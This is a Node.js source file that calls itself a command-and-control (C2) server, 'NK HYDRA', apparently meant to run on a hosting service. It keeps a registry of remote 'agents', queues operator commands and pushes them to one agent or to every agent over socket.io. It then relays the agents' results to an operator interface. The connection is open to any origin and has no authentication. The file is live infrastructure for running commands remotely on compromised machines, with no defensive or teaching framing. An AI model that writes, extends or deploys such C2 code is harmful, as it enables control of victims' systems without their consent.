// TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
// NK HYDRA v132.0 [GOD MODE - STABLE QUEUE & HEARTBEAT]
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());
app.get('/health', (req, res) => { res.status(200).send('OK'); });
app.get('/', (req, res) => { res.json({ status: 'online', version: 'v132.0' }); });

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*", methods: ["GET", "POST"] }, pingInterval: 25000, pingTimeout: 60000 });
let agents = []; const commandQueue = []; let isProcessingQueue = false;

const processQueue = async () => {
    if (isProcessingQueue || commandQueue.length === 0) return;
    isProcessingQueue = true;
    while (commandQueue.length > 0) {
        const task = commandQueue.shift();
        if (task) {
            try {
                if (task.targetId === 'all') io.emit('exec_cmd', { cmd: task.cmd, id: task.id });
                else {
                    const agent = agents.find(a => a.id === task.targetId);
                    if (agent && agent.socketId) io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
                }
            } catch (e) { console.error("Queue Error:", e); }
        }
        await new Promise(r => setTimeout(r, 200)); 
    }
    isProcessingQueue = false;
};

io.on('connection', (socket) => {
    socket.on('heartbeat', (data) => { const agent = agents.find(a => a.socketId === socket.id); if (agent) agent.lastSeen = Date.now(); });
    socket.on('identify', (data) => {
        if (data.type === 'ui') { socket.join('ui_room'); socket.emit('agents_list', agents); return; }
        // Clean up old instances of same ID
        agents = agents.filter(a => a.id !== data.id);
        agents.push({ ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() });
        io.to('ui_room').emit('agents_list', agents);
    });
    socket.on('exec_cmd', (data) => {
        commandQueue.push({ targetId: data.targetId, cmd: data.cmd, id: Date.now().toString() });
        io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `Queued: ${data.cmd}` });
        processQueue();
    });
    socket.on('agent_event', (data) => { io.to('ui_room').emit('agent_event', data); });
    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { agent.status = 'Offline'; io.to('ui_room').emit('agents_list', agents); }
    });
});
server.listen(process.env.PORT || 3000, () => console.log('HYDRA ONLINE'));

